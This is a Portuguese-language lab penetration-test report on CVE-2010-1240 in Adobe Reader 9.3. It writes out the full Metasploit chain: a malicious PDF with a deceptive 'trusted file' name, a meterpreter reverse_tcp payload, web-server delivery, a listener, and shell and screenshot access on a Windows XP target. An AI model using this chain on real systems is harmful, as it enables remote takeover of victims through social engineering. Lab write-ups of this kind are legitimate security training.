<div style="font-family: Helvetica, Arial, sans-serif; line-height: 1.6; max-width: 900px; margin: auto; color: #333;">

    <h1 style="border-bottom: 2px solid #333; padding-bottom: 10px; color: #000;">RELATORIO TECNICO: ANALISE DE VULNERABILIDADE (CVE-2010-1240)</h1>

    <p style="background-color: #f4f4f4; padding: 10px; border-left: 5px solid #333;">
        <strong>DOCUMENTO DE NIVEL CONFIDENCIAL</strong><br>
        <strong>Data da Operacao:</strong> 19 de Novembro de 2025<br>
        <strong>Responsaveis Tecnicos:</strong> Yuri Alexander e Gabriel Machado<br>
        <strong>Objeto de Analise:</strong> Exploracao de Falha em Client-Side (Adobe Reader 9.3)
    </p>

    <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">

    <h3 style="color: #000;">Video 1: POC - Adobe Reader Exploit</h3>
    <p>Registro visual da operacao realizada em ambiente de laboratorio:</p>

    <div align="center" style="background-color: #eaeaea; padding: 20px; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 20px;">
        <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
            <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
                 alt="Assistir Video da POC" 
                 style="width: 100%; max-width: 650px; border: 1px solid #999; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
        </a>
        <p style="margin-top: 15px; font-size: 14px;">
            <strong>CLIQUE NA IMAGEM ACIMA PARA ASSISTIR A DEMONSTRACAO</strong><br>
            <span style="color: #555;">Link externo: https://youtu.be/lntV_v_hTH0</span>
        </p>
        <p style="margin-top: 5px; font-size: 12px; color: #666;">
            (Arquivo local disponivel no repositorio: <code>video.mp4</code>)
        </p>
    </div>

    <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">

    <h3 style="color: #000;">1. RESUMO DO CENARIO</h3>
    <p>A operacao consistiu em um teste de intrusao focado em Engenharia Social e exploracao de vulnerabilidade de software desatualizado. O objetivo foi obter acesso remoto a uma estacao de trabalho Windows XP atraves de um arquivo PDF malicioso.</p>

    <ul style="background-color: #f9f9f9; padding: 15px 15px 15px 40px; border: 1px solid #ddd;">
        <li><strong>Maquina Atacante (Kali Linux):</strong> IP 192.168.20.2 (Interface eth0)</li>
        <li><strong>Maquina Alvo (Windows XP):</strong> Sub-rede 192.168.20.x, executando Adobe Reader 9.3</li>
        <li><strong>Vetor de Ataque:</strong> Metasploit Framework / Apache Web Server</li>
    </ul>

    <br>

    <h3 style="color: #000;">2. EXECUCAO TECNICA DETALHADA</h3>

    <h4>Fase 1: Configuracao do Exploit (Adobe PDF Embedded EXE)</h4>
    <p>Os analistas selecionaram o modulo responsavel por embutir um executavel malicioso dentro de uma estrutura de arquivo PDF. Esta tecnica depende da interacao do usuario para ser efetiva.</p>

    <div style="background-color: #2d2d2d; color: #ccc; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px;">
        msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
    </div>

    <h4>Fase 2: Definicao do Payload e Parametros de Rede</h4>
    <p>Nesta etapa, foi configurado o codigo que estabelece a conexao reversa (o alvo conecta no atacante). O nome do arquivo foi definido como "ArquivoConfiavel.pdf" para aumentar a probabilidade de execucao pela vitima.</p>

    <div style="background-color: #2d2d2d; color: #ccc; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px;">
        msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp<br>
        msf exploit(...) > set LHOST 192.168.20.2<br>
        msf exploit(...) > set LPORT 4444<br>
        msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf
    </div>

    <div style="margin: 20px 0; padding: 15px; border-left: 5px solid #d9534f; background-color: #fdf7f7;">
        <strong>NOTA DE TROUBLESHOOTING (ANALISE DE FALHA):</strong><br>
        Durante a execucao inicial, a conexao reversa falhou. A equipe identificou, atraves da interface grafica de rede do Kali Linux ("Wired connection 1"), que o endereco IP local nao correspondia ao configurado no exploit.<br><br>
        <strong>Acao Corretiva:</strong> O comando <code>set LHOST 192.168.20.2</code> foi reexecutado e o exploit foi gerado novamente para garantir a integridade da conexao.
    </div>

    <p><strong>Geracao do Artefato Final:</strong></p>
    <div style="background-color: #2d2d2d; color: #ccc; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px;">
        msf exploit(...) > exploit<br>
        # [+] Arquivo gerado com sucesso em: /root/.msf4/local/ArquivoConfiavel.pdf
    </div>

    <h4>Fase 3: Distribuicao (Delivery)</h4>
    <p>Para simular um cenario real de download, o arquivo foi movido para o diretorio publico do servidor web Apache.</p>

    <div style="background-color: #2d2d2d; color: #ccc; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px;">
        # Copia do arquivo para o servidor web<br>
        cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/
    </div>

    <h4>Fase 4: Configuracao do Handler (Escuta)</h4>
    <p>O console do Metasploit foi configurado para aguardar conexoes na porta 4444.</p>

    <div style="background-color: #2d2d2d; color: #ccc; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px;">
        msf > use exploit/multi/handler<br>
        msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp<br>
        msf exploit(handler) > set LHOST 192.168.20.2<br>
        msf exploit(handler) > exploit
    </div>

    <br>
    <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">

    <h3 style="color: #000;">3. COMPROMETIMENTO DO ALVO</h3>

    <p>A sequencia de acoes na maquina da vitima resultou na execucao do codigo arbitrario:</p>
    <ol>
        <li>O usuario acessou o endereco <code>http://192.168.20.2</code> via Internet Explorer.</li>
        <li>O download do arquivo <strong>ArquivoConfiavel.pdf</strong> foi realizado para o Desktop.</li>
        <li>Ao abrir o arquivo, o Adobe Reader exibiu o alerta de seguranca: <em>"The file and its viewer application are set to be launched by this PDF file"</em>.</li>
        <li>O usuario ignorou o aviso e clicou no botao <strong>Open</strong>.</li>
    </ol>
    <p><em>Comportamento observado: Uma janela de prompt de comando (CMD) apareceu brevemente e fechou, indicando a injecao do processo na memoria.</em></p>

    <br>

    <h3 style="color: #000;">4. POS-EXPLORACAO E EVIDENCIAS</h3>

    <p>Imediatamente apos a acao do usuario, a sessao foi estabelecida no console do atacante.</p>

    <div style="background-color: #000; color: #0f0; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: Consolas, monospace; font-size: 13px; border: 1px solid #333;">
        [*] Sending stage (179771 bytes) to 192.168.20.x<br>
        [*] Meterpreter session 1 opened (192.168.20.2:4444 -> 192.168.20.x:1045)
    </div>

    <p>Para confirmar o nivel de acesso, foram executados os seguintes comandos:</p>

    <p><strong>1. Captura de Tela (Reconhecimento Visual)</strong></p>
    <div style="background-color: #2d2d2d; color: #ccc; padding: 10px; border-radius: 4px; font-family: Consolas, monospace; font-size: 13px;">
        meterpreter > screenshot<br>
        # Screenshot saved to /root/screenshot.jpeg
    </div>

    <p><strong>2. Acesso ao Shell do Sistema (Controle Total)</strong></p>
    <div style="background-color: #2d2d2d; color: #ccc; padding: 10px; border-radius: 4px; font-family: Consolas, monospace; font-size: 13px;">
        meterpreter > shell<br>
        C:\Documents and Settings\Administrator\Desktop>
    </div>

    <br>
    <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">

    <h3 style="color: #000;">5. CONCLUSAO</h3>
    <p>O teste foi concluido com exito, demonstrando vulnerabilidade critica no ambiente analisado. A combinacao de software desatualizado com a falta de conscientizacao do usuario permitiu o comprometimento total da confidencialidade e integridade do sistema alvo.</p>

</div>
